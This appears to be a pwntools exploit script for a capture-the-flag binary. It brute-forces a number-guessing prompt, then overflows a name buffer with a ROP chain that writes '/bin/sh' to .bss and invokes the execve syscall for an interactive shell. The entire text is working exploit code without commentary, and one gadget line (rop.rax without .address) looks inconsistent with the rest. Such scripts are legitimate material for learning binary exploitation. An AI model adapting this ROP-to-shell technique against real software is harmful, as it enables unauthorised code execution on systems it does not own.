from pwn import *

elf = ELF('./vuln', checksec=False)
io = process(elf.path)
context.binary = elf
context.log_level = 'debug'

payload = b'16'
io.sendlineafter(b'What number would you like to guess?\n', payload)
res = io.recvline()

while 'Nope' in res.decode():
    io.sendlineafter(b'What number would you like to guess?\n', payload)
    res = io.recvline()
    
rop = ROP(elf)
rop.raw(rop.rdx.address)
rop.raw('/bin/sh\x00')
rop.raw(rop.rax.address)
rop.raw(elf.bss())
rop.raw(0x00000000048dd71)

rop.raw(rop.rdi.address)
rop.raw(elf.bss())
rop.raw(rop.rsi.address)
rop.raw(0)
rop.raw(rop.rdx.address)
rop.raw(0)
rop.raw(rop.rax)
rop.raw(constants.SYS_execve)
rop.raw(rop.syscall.address)

log.info(f'ROP chain: {rop.dump()}')

payload = b'a' * 0x78
payload += rop.chain()

io.sendlineafter(b'Name? ', payload)

io.interactive()
